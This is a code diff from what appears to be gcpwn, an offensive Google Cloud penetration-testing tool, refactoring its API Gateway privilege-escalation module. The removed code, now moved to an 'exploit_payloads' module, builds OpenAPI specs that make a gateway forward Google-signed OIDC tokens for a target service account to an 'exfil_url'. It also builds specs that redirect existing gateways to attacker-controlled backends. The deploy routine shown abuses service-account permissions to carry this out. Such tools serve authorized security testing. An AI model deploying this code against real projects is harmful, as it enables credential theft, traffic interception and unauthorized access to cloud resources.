@@ -1,6 +1,9 @@
 from __future__ import annotations
 
 import base64
+import sys
+import time
+import uuid
 from pathlib import Path
 from typing import Any, Iterable
 
@@ -20,18 +23,14 @@ from gcpwn.core.utils.service_runtime import DownloadBudget, handle_service_erro
 
 
 def _safe_path_parts(relative_path: str) -> list[str]:
-    parts: list[str] = []
-    for part in Path(str(relative_path or "")).parts:
-        token = str(part).strip()
-        if not token or token in {".", "..", "/"}:
-            continue
-        parts.append(token)
-    return parts
+    return [
+        part for part in Path(relative_path or "").parts
+        if part and part not in {".", "..", "/"}
+    ]
 
 
 def _flatten_filename_parts(parts: list[str]) -> str:
-    tokens = [str(part).strip().replace("/", "_") for part in (parts or []) if str(part).strip()]
-    return "_".join(tokens)
+    return "_".join(p.replace("/", "_") for p in parts if p)
 
 
 def _file_payload_from_openapi_document(document: Any) -> dict[str, Any]:
@@ -44,7 +43,7 @@ def _file_payload_from_openapi_document(document: Any) -> dict[str, Any]:
     file_payload = payload.get("document")
     if isinstance(file_payload, dict):
         return file_payload
-    source_payload = payload.get("document") or payload.get("source_contents")
+    source_payload = payload.get("source_contents")
     if isinstance(source_payload, dict):
         return source_payload
     file_attr = getattr(document, "document", None)
@@ -74,127 +73,11 @@ def _decode_file_contents(contents: Any) -> bytes:
 
 resolve_regions = region_resolver_for("apigateway", ("apigateway", "v1"))
 
-
-# ── Spec builders ─────────────────────────────────────────────────────────────
-
-def _rand_id(n: int = 16) -> str:
-    import random, string
-    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
-
-
-def build_oidc_spec(exfil_url: str, path: str | None = None, gateway_host: str = "10.0.0.1") -> tuple[str, str]:
-    """Return (openapi_yaml, trigger_path) for an OIDC-capture spec.
-
-    ESPv2 injects a Google-signed OIDC JWT as ``Authorization: Bearer`` when it
-    forwards requests to ``exfil_url``.  ``jwt_audience`` is set to ``exfil_url``
-    so the JWT validates against the callback.
-    """
-    random_path = path or _rand_id(16)
-    yaml = f"""\
-swagger: "2.0"
-info:
-  title: gcpwn-pe-gateway
-  description: "OIDC retrieval via API Gateway gatewayServiceAccount"
-  version: "1.0.0"
-host: "{gateway_host}"
-schemes:
-  - "https"
-produces:
-  - "application/json"
-paths:
-  /{random_path}:
-    get:
-      summary: "Token delivery endpoint"
-      operationId: "getToken{_rand_id(6)}"
-      responses:
-        200:
-          description: "OK"
-      x-google-backend:
-        address: "{exfil_url}"
-        jwt_audience: "{exfil_url}"
-        protocol: "http/1.1"
-"""
-    return yaml, f"/{random_path}"
-
-
-def build_proxy_spec(backend_url: str, *, path: str = "proxy", gateway_host: str = "10.0.0.1") -> tuple[str, str]:
-    """Return (openapi_yaml, trigger_path) for a proxy/MITM spec.
-
-    Forwards GET and POST to ``backend_url`` without OIDC injection.  Useful for
-    redirecting an existing gateway's backend to an attacker-controlled URL.
-    """
-    path = path.lstrip("/")
-    yaml = f"""\
-swagger: "2.0"
-info:
-  title: gcpwn-proxy-spec
-  version: "1.0.0"
-host: "{gateway_host}"
-schemes:
-  - "https"
-paths:
-  /{path}:
-    get:
-      operationId: proxyGet{_rand_id(4)}
-      responses:
-        200:
-          description: "OK"
-      x-google-backend:
-        address: "{backend_url}"
-        protocol: "http/1.1"
-    post:
-      operationId: proxyPost{_rand_id(4)}
-      parameters:
-        - in: body
-          name: body
-          schema:
-            type: object
-      responses:
-        200:
-          description: "OK"
-      x-google-backend:
-        address: "{backend_url}"
-        protocol: "http/1.1"
-"""
-    return yaml, f"/{path}"
-
-
-def build_open_spec(backend_url: str, *, path: str = "api", gateway_host: str = "10.0.0.1") -> tuple[str, str]:
-    """Return (openapi_yaml, trigger_path) for an open-proxy spec.
-
-    Like build_proxy_spec but covers GET/POST/PUT/DELETE for broader internal
-    service access.  No gatewayServiceAccount needed — no OIDC injection.
-    """
-    path = path.lstrip("/")
-    rand_host = gateway_host
-
-    def _backend(op: str) -> str:
-        return (
-            f"      operationId: open{op.title()}{_rand_id(4)}\n"
-            f"      responses:\n        200:\n          description: OK\n"
-            f"      x-google-backend:\n        address: \"{backend_url}\"\n        protocol: \"http/1.1\""
-        )
-
-    yaml = f"""\
-swagger: "2.0"
-info:
-  title: gcpwn-open-spec
-  version: "1.0.0"
-host: "{rand_host}"
-schemes:
-  - "https"
-paths:
-  /{path}:
-    get:
-{_backend('get')}
-    post:
-{_backend('post')}
-    put:
-{_backend('put')}
-    delete:
-{_backend('delete')}
-"""
-    return yaml, f"/{path}"
+from gcpwn.modules.gcp.apigateway.utilities.exploit_payloads import (
+    build_oidc_spec,
+    build_open_spec,
+    build_proxy_spec,
+)
 
 
 def _fetch_gateway_hostname(client, gateway_name: str) -> str:
@@ -209,7 +92,6 @@ def _fetch_gateway_hostname(client, gateway_name: str) -> str:
 
 def _fetch_gateway_spec(client, gateway_name: str) -> str:
     """Return the OpenAPI YAML from the gateway's current active config, or empty string."""
-    import base64 as _b64
     try:
         from google.cloud.apigateway_v1 import GetGatewayRequest, GetApiConfigRequest
         gw = client.get_gateway(request=GetGatewayRequest(name=gateway_name))
@@ -226,7 +108,7 @@ def _fetch_gateway_spec(client, gateway_name: str) -> str:
                 if isinstance(contents, bytes):
                     return contents.decode("utf-8", errors="replace")
                 try:
-                    return _b64.b64decode(contents).decode("utf-8", errors="replace")
+                    return base64.b64decode(contents).decode("utf-8", errors="replace")
                 except Exception:
                     return str(contents)
         return ""
@@ -234,7 +116,7 @@ def _fetch_gateway_spec(client, gateway_name: str) -> str:
         return ""
 
 
-def merge_openapi_paths(existing_yaml: str, new_yaml: str) -> str:
+def _merge_openapi_paths(existing_yaml: str, new_yaml: str) -> str:
     """Inject the paths from new_yaml into existing_yaml, preserving all other existing content.
 
     Only ``paths`` is merged; ``info``, ``host``, ``schemes``, ``securityDefinitions``
@@ -272,6 +154,10 @@ class _ApiGatewayBaseResource:
     test_iam_permissions_starting_list: tuple[str, ...] = ()
     test_iam_permissions_api_name = ""
 
+    @property
+    def TEST_IAM_PERMISSIONS(self) -> tuple[str, ...]:
+        return self.test_iam_permissions_starting_list
+
     def __init__(self, session) -> None:
         self.session = session
         try:
@@ -283,9 +169,6 @@ class _ApiGatewayBaseResource:
         self._apigateway_v1 = apigateway_v1
         self.client = apigateway_v1.ApiGatewayServiceClient(credentials=session.credentials)
         self._discovery_service = None
-
-    def _request(self, callback):
-        return callback()
 
     def resource_name(self, row: Any) -> str:
         payload = resource_to_dict(row)
@@ -372,7 +255,7 @@ class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
         parent = f"projects/{project_id}/locations/{location}"
         try:
             request = self._apigateway_v1.ListGatewaysRequest(parent=parent)
-            rows = [resource_to_dict(gateway) for gateway in self._request(lambda: self.client.list_gateways(request=request))]
+            rows = [resource_to_dict(gateway) for gateway in self.client.list_gateways(request=request)]
             record_permissions(
                 action_dict,
                 permissions=self.LIST_API_NAME,
@@ -393,7 +276,7 @@ class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
         name = name or resource_id
         try:
             request = self._apigateway_v1.GetGatewayRequest(name=name)
-            row = resource_to_dict(self._request(lambda: self.client.get_gateway(request=request)))
+            row = resource_to_dict(self.client.get_gateway(request=request))
             if row:
                 record_permissions(
                     action_dict,
@@ -423,7 +306,6 @@ class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
         Requires apigateway.gateways.update (not gateways.create).
         Waits for any in-progress gateway update to settle before issuing a new one.
         """
-        import time as _time
         from google.protobuf import field_mask_pb2
         # Wait for any concurrent gateway update to settle before sending ours.
         for _ in range(18):  # up to 3 min, 10 s intervals
@@ -435,7 +317,7 @@ class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
                     break
             except Exception:
                 break
-            _time.sleep(10)
+            time.sleep(10)
         gateway = self._apigateway_v1.Gateway(name=gateway_name, api_config=api_config_resource)
         mask = field_mask_pb2.FieldMask(paths=["api_config"])
         operation = self.client.update_gateway(
@@ -463,8 +345,8 @@ class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
                 request=self._apigateway_v1.DeleteGatewayRequest(name=name)
             )
             operation.result(timeout=120)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[!] Cleanup warning — delete_gateway({name}): {e}")
 
     def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, location: str | None = None, **_) -> None:
         for row in rows or []:
@@ -511,7 +393,7 @@ class ApiGatewayApisResource(_ApiGatewayBaseResource):
         parent = f"projects/{project_id}/locations/global"
         try:
             request = self._apigateway_v1.ListApisRequest(parent=parent)
-            rows = [resource_to_dict(api) for api in self._request(lambda: self.client.list_apis(request=request))]
+            rows = [resource_to_dict(api) for api in self.client.list_apis(request=request)]
             record_permissions(
                 action_dict,
                 permissions=self.LIST_API_NAME,
@@ -532,7 +414,7 @@ class ApiGatewayApisResource(_ApiGatewayBaseResource):
         name = name or resource_id
         try:
             request = self._apigateway_v1.GetApiRequest(name=name)
-            row = resource_to_dict(self._request(lambda: self.client.get_api(request=request)))
+            row = resource_to_dict(self.client.get_api(request=request))
             if row:
                 record_permissions(
                     action_dict,
@@ -570,8 +452,8 @@ class ApiGatewayApisResource(_ApiGatewayBaseResource):
                 request=self._apigateway_v1.DeleteApiRequest(name=name)
             )
             operation.result(timeout=120)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[!] Cleanup warning — delete_api({name}): {e}")
 
     def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, location: str | None = None, **_) -> None:
         for row in rows or []:
@@ -620,7 +502,7 @@ class ApiGatewayConfigsResource(_ApiGatewayBaseResource):
         api_name = api_name or parent
         try:
             request = self._apigateway_v1.ListApiConfigsRequest(parent=api_name)
-            rows = [resource_to_dict(config) for config in self._request(lambda: self.client.list_api_configs(request=request))]
+            rows = [resource_to_dict(config) for config in self.client.list_api_configs(request=request)]
             record_permissions(
                 action_dict,
                 permissions=self.LIST_API_NAME,
@@ -646,7 +528,7 @@ class ApiGatewayConfigsResource(_ApiGatewayBaseResource):
             view_enum = getattr(self._apigateway_v1.GetApiConfigRequest, "ConfigView", None)
             full_view = getattr(view_enum, "FULL", "FULL")
             request = self._apigateway_v1.GetApiConfigRequest(name=name, view=full_view)
-            row = resource_to_dict(self._request(lambda: self.client.get_api_config(request=request)))
+            row = resource_to_dict(self.client.get_api_config(request=request))
             if row:
                 record_permissions(
                     action_dict,
@@ -742,7 +624,7 @@ class ApiGatewayConfigsResource(_ApiGatewayBaseResource):
             parent=parent, api_config_id=config_id, api_config=api_config
         )
         operation = self.client.create_api_config(request=request)
-        result = resource_to_dict(operation.result(timeout=300))
+        result = resource_to_dict(operation.result(timeout=600))
         state = str(result.get("state", "")).upper()
         if state in ("FAILED", "3"):
             raise RuntimeError(
@@ -758,8 +640,8 @@ class ApiGatewayConfigsResource(_ApiGatewayBaseResource):
                 request=self._apigateway_v1.DeleteApiConfigRequest(name=name)
             )
             operation.result(timeout=120)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"[!] Cleanup warning — delete_api_config({name}): {e}")
 
     def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, api_name: str = "", location: str | None = None, **_) -> None:
         for row in rows or []:
@@ -828,7 +710,7 @@ def deploy_apigateway_resources(
     suffix: str | None = None,
     region: str = "us-central1",
     merge_existing_spec: bool = False,
-) -> "dict | None":
+) -> dict | None:
     """Create/reuse API → API config → gateway. Returns result dict or None on failure.
 
     When stdin is a TTY and no --existing-api/--existing-gateway flags are supplied,
@@ -839,19 +721,23 @@ def deploy_apigateway_resources(
     api_id, achieved_perms, created_api, created_gateway.
     Permission recording into session is handled internally.
     """
-    import sys
-    import uuid as _uuid
-
-    suffix = suffix or str(_uuid.uuid4())[:8]
+    suffix = suffix or str(uuid.uuid4())[:8]
     interactive = sys.stdin.isatty()
+
+    if not existing_api or not existing_gateway:
+        print(
+            f"\n{UtilityTools.YELLOW}[*] Full deploy: ~20 min total "
+            f"(ESPv2 config compilation up to 10 min + gateway deploy up to 10 min).{UtilityTools.RESET}\n"
+            f"    Press Ctrl+C at any time — cleanup commands will be printed."
+        )
 
     apis_r    = ApiGatewayApisResource(session)
     configs_r = ApiGatewayConfigsResource(session)
     gws_r     = ApiGatewayGatewaysResource(session)
 
-    api_resource: "str | None" = None
-    config_resource: "str | None" = None
-    gw_resource: "str | None" = None
+    api_resource: str | None = None
+    config_resource: str | None = None
+    gw_resource: str | None = None
     gw_url = ""
     api_id = ""
     created_api = False
@@ -890,6 +776,10 @@ def deploy_apigateway_resources(
             api_resource = apis_r.create(api_id=api_id, project_id=project_id)
             achieved_perms.append("apigateway.apis.create")
             created_api = True
+        except KeyboardInterrupt:
+            print(f"\n{UtilityTools.YELLOW}[!] Interrupted. Cleanup if API was created:{UtilityTools.RESET}")
+            print(f"    gcloud api-gateway apis delete gcpwn-pe-api-{suffix} --project {project_id} --location global")
+            raise
         except Exception as e:
             print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
             return None
@@ -900,7 +790,7 @@ def deploy_apigateway_resources(
         existing_spec = _fetch_gateway_spec(gws_r.client, existing_gateway)
         if existing_spec:
             print(f"\n{UtilityTools.CYAN}[*] Merging our path into existing gateway spec...{UtilityTools.RESET}")
-            openapi_yaml = merge_openapi_paths(existing_spec, openapi_yaml)
+            openapi_yaml = _merge_openapi_paths(existing_spec, openapi_yaml)
         else:
             print(f"\n{UtilityTools.YELLOW}[!] --merge-existing-spec: could not read existing spec; using new spec only.{UtilityTools.RESET}")
 
@@ -908,7 +798,7 @@ def deploy_apigateway_resources(
     config_id = f"gcpwn-pe-config-{suffix}"
     sa_hint = f" (gatewayServiceAccount={target_sa})" if target_sa else ""
     print(f"\n{UtilityTools.YELLOW}[2] Creating API config{sa_hint}{UtilityTools.RESET}")
-    print(f"    {UtilityTools.YELLOW}Waiting up to 5 min for ESPv2 compilation...{UtilityTools.RESET}")
+    print(f"    {UtilityTools.YELLOW}Waiting up to 10 min for ESPv2 compilation...{UtilityTools.RESET}")
     try:
         config_resource = configs_r.create(
             api_id=api_id,
@@ -920,9 +810,20 @@ def deploy_apigateway_resources(
         achieved_perms.append("apigateway.apiconfigs.create")
         if target_sa:
             achieved_perms.append("iam.serviceAccounts.actAs")
+    except KeyboardInterrupt:
+        print(f"\n{UtilityTools.YELLOW}[!] Interrupted during config compilation. Manual cleanup:{UtilityTools.RESET}")
+        print(f"    gcloud api-gateway api-configs delete gcpwn-pe-config-{suffix} --api gcpwn-pe-api-{suffix} --project {project_id} --location global")
+        if created_api:
+            print(f"    gcloud api-gateway apis delete gcpwn-pe-api-{suffix} --project {project_id} --location global")
+        raise
     except Exception as e:
         print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
         if created_api and api_resource:
+            # Delete the config by its predictable name first so the API
+            # delete doesn't fail on "resource has nested resources".
+            constructed_config = f"projects/{project_id}/locations/global/apis/{api_id}/configs/{config_id}"
+            print(f"{UtilityTools.YELLOW}    Attempting cleanup of config {config_id} (may still be compiling)...{UtilityTools.RESET}")
+            configs_r.delete(name=constructed_config)
             apis_r.delete(name=api_resource)
         return None
     print(f"{UtilityTools.GREEN}    Created: {config_resource}{UtilityTools.RESET}")
@@ -954,6 +855,10 @@ def deploy_apigateway_resources(
             gw_url = f"https://{h}" if h else ""
             achieved_perms.append("apigateway.gateways.update")
             print(f"{UtilityTools.GREEN}    Updated: {gw_url}{UtilityTools.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{UtilityTools.YELLOW}[!] Interrupted during gateway update. Manual cleanup:{UtilityTools.RESET}")
+            print(f"    gcloud api-gateway api-configs delete gcpwn-pe-config-{suffix} --api {api_id} --project {project_id} --location global")
+            raise
         except Exception as e:
             print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
             configs_r.delete(name=config_resource)
@@ -977,6 +882,13 @@ def deploy_apigateway_resources(
             achieved_perms.append("apigateway.gateways.create")
             created_gateway = True
             print(f"{UtilityTools.GREEN}    Deployed: {gw_url}{UtilityTools.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{UtilityTools.YELLOW}[!] Interrupted during gateway creation. Manual cleanup:{UtilityTools.RESET}")
+            print(f"    gcloud api-gateway gateways delete gcpwn-pe-gw-{suffix} --project {project_id} --location {region}")
+            print(f"    gcloud api-gateway api-configs delete gcpwn-pe-config-{suffix} --api {api_id} --project {project_id} --location global")
+            if created_api:
+                print(f"    gcloud api-gateway apis delete {api_id} --project {project_id} --location global")
+            raise
         except Exception as e:
             print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
             configs_r.delete(name=config_resource)
@@ -986,7 +898,7 @@ def deploy_apigateway_resources(
 
     if achieved_perms:
         ad: dict = {}
-        ad.setdefault("project_permissions", {}).setdefault(project_id, set()).update(achieved_perms)
+        record_permissions(ad, permissions=set(achieved_perms), scope_key="project_permissions", scope_label=project_id)
         session.insert_actions(ad, project_id)
 
     return {
@@ -1003,10 +915,9 @@ def deploy_apigateway_resources(
 
 def cleanup_apigateway_resources(session, result: dict, *, delay: int = 0) -> None:
     """Delete gateway/config/API that were CREATED (not reused) during deploy."""
-    import time as _time
     if delay > 0:
         print(f"\n{UtilityTools.YELLOW}[*] Waiting {delay}s before cleanup...{UtilityTools.RESET}")
-        _time.sleep(delay)
+        time.sleep(delay)
     print(f"\n{UtilityTools.YELLOW}[*] Cleaning up created resources...{UtilityTools.RESET}")
     gws_r  = ApiGatewayGatewaysResource(session)
     cfg_r  = ApiGatewayConfigsResource(session)
